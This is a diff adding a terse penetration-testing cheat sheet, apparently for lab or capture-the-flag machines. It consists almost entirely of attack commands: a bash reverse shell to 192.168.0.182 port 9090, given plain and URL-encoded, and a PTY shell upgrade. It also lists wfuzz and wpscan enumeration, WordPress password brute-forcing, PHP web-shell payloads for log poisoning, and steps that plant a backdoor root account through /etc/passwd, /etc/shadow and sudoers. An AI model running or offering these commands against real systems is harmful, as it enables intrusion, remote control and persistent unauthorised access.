@@ -1,0 +1,47 @@
+install tty using python: python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+alias ll='clear ; ls -lsaht --color=auto'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+stty raw -echo ; fg ; reset 
+bash -c 'bash -i >& /dev/tcp/192.168.0.182/9090 0>&1'
+bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.182%2F9090%200%3E%261%27
+----------------------------------------
+WFUZZ Scan:
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$url"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$url"
+#Parameter Discovery:
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404  "$url"
+-------------------------------------------
+WPScan:
+wpscan --url $url --enumerate t --enumerate u -v
+wpscan --url $url --disbale-tls-checks --enumerate t --enumerate p --enumerate u
+wpscan --url $url --disable-tls-checks -U users -P passwd 
+-----------------------------------------
+SUIDS:
+find / -perm -u=s -type f 2>/dev/null
+-----------------------------------------
+#log posioning
+GET /<?php system($_GET['cmd']); ?>
+GET /<?php passthru($_GET['cmd']); ?>
+-----------------------------------------
+Add new User:
+# choose next UID/GID (check /etc/passwd for last UID)
+echo 'arfat:x:1003:1003:New User:/home/arfat:/bin/bash' >> /etc/passwd
+mkdir -p /home/arfat      
+cp -a /etc/skel/. /home/arfat      
+chown -R 1003:1003 /home/arfat      
+
+Set user passwd:
+# generate hash (do this on a safe machine if openssl absent)
+openssl passwd -1 '26472'
+# copy the resulting hash and append to /etc/shadow in the form:
+# arfat:<hash>:17955:0:99999:7:::
+
+#/etc/shadow
+arfat:$1$TebfD20d$GuVgFxi6Z9eYUltbFTdv11:17955:0:99999:7:::
+#/etc/passwd
+arfat:$1$TebfD20d$GuVgFxi6Z9eYUltbFTdv11:0:0:arfat:/home/arfat:/bin/bash
+-----------------------------------------
+# Edit sudoers file: 
+nano /etc/sudoers
+arfat   ALL=(ALL:ALL) ALL
